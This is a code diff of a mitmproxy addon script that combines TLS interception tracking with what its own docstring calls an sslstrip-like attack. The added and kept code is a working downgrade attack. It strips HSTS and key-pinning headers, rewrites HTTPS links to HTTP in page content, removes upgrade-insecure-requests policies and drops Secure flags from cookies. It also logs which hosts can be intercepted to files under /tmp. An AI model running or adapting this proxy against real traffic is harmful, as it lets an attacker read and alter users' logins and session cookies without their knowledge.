@@ -1,25 +1,28 @@
-import re
-from six.moves import urllib
-
-from __future__ import absolute_import, print_function, division
 import collections
 import random
-
-import sys
-from enum import Enum
-
+import re
+import os
+import urllib.parse
+import typing  # noqa
 import mitmproxy
-from mitmproxy.exceptions import TlsProtocolException
-from mitmproxy.protocol import TlsLayer, RawTCPLayer
 
+from enum import Enum
+from mitmproxy import ctx
+from mitmproxy.exceptions import TlsProtocolException
+from mitmproxy.proxy.protocol import TlsLayer, RawTCPLayer
+from mitmproxy import http
 
 class InterceptionResult(Enum):
     success = True
     failure = False
     skipped = None
 
+mitmable = set()
+mitmableFileName = '/tmp/mitmable.txt'
+unMitmable = set()
+unMitmableFileName = '/tmp/unMitmable.txt'
 
-class _TlsStrategy(object):
+class _TlsStrategy:
     """
     Abstract base class for interception strategies.
     """
@@ -38,9 +41,16 @@ class _TlsStrategy(object):
 
     def record_success(self, server_address):
         self.history[server_address].append(InterceptionResult.success)
+        with open(mitmableFileName, 'a') as the_file:
+            the_file.write("%s\n" % str(server_address))
+            mitmable.add(server_address)
 
     def record_failure(self, server_address):
         self.history[server_address].append(InterceptionResult.failure)
+        with open(unMitmableFileName, 'a') as the_file:
+            the_file.write("%s\n" % str(server_address))
+            unMitmable.add(server_address)
+                #the_file.write(str(server_address)+":" + str(tls_strategy.should_intercept(server_address)) +'\n')
 
     def record_skipped(self, server_address):
         self.history[server_address].append(InterceptionResult.skipped)
@@ -57,17 +67,26 @@ class ConservativeStrategy(_TlsStrategy):
             return False
         return True
 
+
+
 class TlsFeedback(TlsLayer):
     """
     Monkey-patch _establish_tls_with_client to get feedback if TLS could be established
     successfully on the client connection (which may fail due to cert pinning).
     """
+    def set_ctx(self,ctx):
+        self.contex = ctx
+        pass
 
     def _establish_tls_with_client(self):
         server_address = self.server_conn.address
 
         try:
+            with open('/tmp/my.log', 'a') as the_file:
+                the_file.write("Connecting to %s\n" % str(server_address))
             super(TlsFeedback, self)._establish_tls_with_client()
+            with open('/tmp/my.log', 'a') as the_file:
+                the_file.write("Done connecting to %s\n" % str(server_address))
         except TlsProtocolException as e:
             tls_strategy.record_failure(server_address)
             raise e
@@ -80,8 +99,23 @@ class TlsFeedback(TlsLayer):
 tls_strategy = None
 
 
-def start():
+def load(l):
+    l.add_option(
+        "tlsstrat", int, 0, "TLS passthrough strategy (0-100)",
+    )
+    try:
+        os.remove(mitmableFileName)
+        os.remove(unMitmableFileName)
+    except Exception:
+        pass
+
+
+def configure(updated):
     global tls_strategy
+    #if ctx.options.tlsstrat > 0:
+    #    tls_strategy = ProbabilisticStrategy(float(ctx.options.tlsstrat) / 100.0)
+    #else:
+    #    tls_strategy = ConservativeStrategy()
     tls_strategy = ConservativeStrategy()
 
 
@@ -92,6 +126,7 @@ def next_layer(next_layer):
     """
     if isinstance(next_layer, TlsLayer) and next_layer._client_tls:
         server_address = next_layer.server_conn.address
+
 
         if tls_strategy.should_intercept(server_address):
             # We try to intercept.
@@ -104,13 +139,24 @@ def next_layer(next_layer):
             next_layer.reply.send(next_layer_replacement)
             tls_strategy.record_skipped(server_address)
 
+
+
+"""
+This script implements an sslstrip-like attack based on mitmproxy.
+https://moxie.org/software/sslstrip/
+"""
+
+
 # set of SSL/TLS capable hosts
-secure_hosts = set()
+secure_hosts: typing.Set[str] = set()
 
 
-def request(flow):
+def request(flow: http.HTTPFlow) -> None:
     flow.request.headers.pop('If-Modified-Since', None)
     flow.request.headers.pop('Cache-Control', None)
+    #mitmproxy.ctx.log(
+    #    "Request: %s" % repr(flow.request),
+    #    "debug")
 
     # do not force https redirection
     flow.request.headers.pop('Upgrade-Insecure-Requests', None)
@@ -120,13 +166,29 @@ def request(flow):
         flow.request.scheme = 'https'
         flow.request.port = 443
 
+        # We need to update the request destination to whatever is specified in the host header:
+        # Having no TLS Server Name Indication from the client and just an IP address as request.host
+        # in transparent mode, TLS server name certificate validation would fail.
+        flow.request.host = flow.request.pretty_host
 
-def response(flow):
-    flow.response.headers.pop('Strict-Transport-Security', None)
-    flow.response.headers.pop('Public-Key-Pins', None)
+
+def response(flow: http.HTTPFlow) -> None:
+    #flow.response.headers.pop('Strict-Transport-Security', None)
+    #flow.response.headers.pop('Public-Key-Pins', None)
+    #mitmproxy.ctx.log(
+    #    "Response: %s" % repr(flow.response.content),
+    #    "debug")
+    if flow.response.headers.pop('Strict-Transport-Security', None) or flow.response.headers.pop('Public-Key-Pins', None):
+        mitmproxy.ctx.log(
+            "Removing headers Strict-Transport-Security and Public-Key-Pins for %s:%s" % (repr(flow.response.host), repr(flow.response.port)),
+            "warn")
 
     # strip links in response body
-    flow.response.content = flow.response.content.replace('https://', 'http://')
+    if b'https://' in flow.response.content:
+        mitmproxy.ctx.log(
+            "Replacing content: %s" % flow.response.content,
+            "debug")
+    flow.response.content = flow.response.content.replace(b'https://', b'http://')
 
     # strip meta tag upgrade-insecure-requests in response body
     csp_meta_tag_pattern = b'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
@@ -144,6 +206,7 @@ def response(flow):
     if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
         csp = flow.response.headers['Content-Security-Policy']
         flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
+        mitmproxy.ctx.log("Removing upgrade-insecure-requests for %s:%s" % (repr(flow.response.host),repr(flow.response.port)), "warn")
 
     # strip secure flag from 'Set-Cookie' headers
     cookies = flow.response.headers.get_all('Set-Cookie')
